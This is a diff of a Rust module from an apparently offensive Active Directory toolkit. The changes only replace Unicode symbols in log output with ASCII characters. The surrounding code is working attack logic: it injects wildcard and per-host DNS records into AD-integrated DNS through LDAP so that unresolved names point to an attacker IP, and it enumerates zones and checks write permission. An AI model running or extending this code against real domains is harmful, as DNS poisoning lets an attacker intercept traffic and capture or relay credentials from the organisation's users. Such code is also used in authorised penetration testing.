@@ -1,4 +1,4 @@
-//! ADIDNS (AD-Integrated DNS) Abuse — Wildcard Record Injection & DNS Poisoning
+//! ADIDNS (AD-Integrated DNS) Abuse -- Wildcard Record Injection & DNS Poisoning
 //!
 //! By default, any authenticated domain user can create DNS records in the
 //! DomainDnsZones partition. This module exploits that to:
@@ -114,7 +114,7 @@ fn build_dns_aaaa_record(ip: &str, ttl: u32) -> Result<Vec<u8>> {
 }
 
 /// Convert domain FQDN to LDAP DN format.
-/// "corp.local" → "DC=corp,DC=local"
+/// "corp.local" -> "DC=corp,DC=local"
 fn domain_to_dn(domain: &str) -> String {
     domain
         .split('.')
@@ -151,7 +151,7 @@ pub async fn inject_wildcard(
 ) -> Result<AdidnsInjectionResult> {
     info!(
         "{}",
-        "═══ ADIDNS Wildcard Record Injection ═══".bold().yellow()
+        "=== ADIDNS Wildcard Record Injection ===".bold().yellow()
     );
 
     let zone_encoded = encode_zone_name(domain);
@@ -183,8 +183,8 @@ pub async fn inject_wildcard(
 
     let dns_record = build_dns_a_record(attacker_ip, ttl)?;
     info!(
-        "  {} Creating wildcard A record → {attacker_ip} ...",
-        "→".cyan()
+        "  {} Creating wildcard A record -> {attacker_ip} ...",
+        "->".cyan()
     );
 
     // Create the DNS node via LDAP add
@@ -199,8 +199,8 @@ pub async fn inject_wildcard(
     )
     .await?;
 
-    info!("  {} Wildcard record injected successfully", "✓".green());
-    info!("  {} Any unresolved hostname → {attacker_ip}", "→".cyan());
+    info!("  {} Wildcard record injected successfully", "[+]".green());
+    info!("  {} Any unresolved hostname -> {attacker_ip}", "->".cyan());
 
     Ok(AdidnsInjectionResult {
         record_dn,
@@ -231,7 +231,7 @@ pub async fn inject_a_record(
 ) -> Result<AdidnsInjectionResult> {
     info!(
         "{}",
-        format!("═══ ADIDNS A Record Injection: {hostname} ═══")
+        format!("=== ADIDNS A Record Injection: {hostname} ===")
             .bold()
             .yellow()
     );
@@ -246,8 +246,8 @@ pub async fn inject_a_record(
     let dns_record = build_dns_a_record(target_ip, ttl)?;
 
     info!(
-        "  {} Creating A record {hostname} → {target_ip} ...",
-        "→".cyan()
+        "  {} Creating A record {hostname} -> {target_ip} ...",
+        "->".cyan()
     );
 
     ldap.add_entry(
@@ -261,7 +261,7 @@ pub async fn inject_a_record(
     )
     .await?;
 
-    info!("  {} A record injected successfully", "✓".green());
+    info!("  {} A record injected successfully", "[+]".green());
 
     Ok(AdidnsInjectionResult {
         record_dn,
@@ -306,9 +306,9 @@ pub async fn inject_aaaa_record(
 
 /// Remove a DNS record from AD-Integrated DNS.
 pub async fn remove_record(ldap: &mut LdapSession, record_dn: &str) -> Result<()> {
-    info!("  {} Removing DNS record: {record_dn}", "→".cyan());
+    info!("  {} Removing DNS record: {record_dn}", "->".cyan());
     ldap.delete_entry(record_dn).await?;
-    info!("  {} DNS record removed", "✓".green());
+    info!("  {} DNS record removed", "[+]".green());
     Ok(())
 }
 
@@ -321,7 +321,7 @@ pub async fn enumerate_zone(ldap: &mut LdapSession, domain: &str) -> Result<Adid
 
     let base_dn = format!("DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}");
 
-    info!("  {} Enumerating DNS zone: {base_dn}", "→".cyan());
+    info!("  {} Enumerating DNS zone: {base_dn}", "->".cyan());
 
     let entries = ldap
         .custom_search_with_base(
@@ -359,7 +359,7 @@ pub async fn enumerate_zone(ldap: &mut LdapSession, domain: &str) -> Result<Adid
 
     info!(
         "  {} Found {} DNS records in zone",
-        "✓".green(),
+        "[+]".green(),
         records.len()
     );
 
@@ -371,7 +371,7 @@ pub async fn enumerate_zone(ldap: &mut LdapSession, domain: &str) -> Result<Adid
 
 /// Print a summary of enumerated DNS records.
 pub fn print_enum_summary(result: &AdidnsEnumResult) {
-    println!("\n{}", "═══ ADIDNS Zone Enumerate ═══".bold().cyan());
+    println!("\n{}", "=== ADIDNS Zone Enumerate ===".bold().cyan());
     println!("  Zone:  {}", result.zone.bold());
     println!("  Records: {}", result.records.len().to_string().bold());
 
@@ -381,10 +381,10 @@ pub fn print_enum_summary(result: &AdidnsEnumResult) {
         } else {
             String::new()
         };
-        println!("    {} {} {}", "●".cyan(), record.name.bold(), status);
+        println!("    {} {} {}", "*".cyan(), record.name.bold(), status);
     }
 
-    println!("{}", "══════════════════════════════\n".cyan());
+    println!("{}", "==============================\n".cyan());
 }
 
 /// Check if the authenticated user can create DNS records (default: true).
@@ -394,7 +394,7 @@ pub async fn check_permissions(ldap: &mut LdapSession, domain: &str) -> Result<b
 
     let container_dn = format!("DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}");
 
-    // Try to search the container — if it exists, we can likely write
+    // Try to search the container -- if it exists, we can likely write
     match ldap
         .custom_search_with_base(&container_dn, "(objectClass=dnsZone)", &["name"])
         .await
@@ -402,7 +402,7 @@ pub async fn check_permissions(ldap: &mut LdapSession, domain: &str) -> Result<b
         Ok(entries) if !entries.is_empty() => {
             info!(
                 "  {} DNS zone container exists, write likely permitted",
-                "✓".green()
+                "[+]".green()
             );
             Ok(true)
         }
@@ -415,7 +415,7 @@ pub async fn check_permissions(ldap: &mut LdapSession, domain: &str) -> Result<b
                 .await
             {
                 Ok(entries) if !entries.is_empty() => {
-                    info!("  {} Forest DNS zone container exists", "✓".green());
+                    info!("  {} Forest DNS zone container exists", "[+]".green());
                     Ok(true)
                 }
                 _ => {
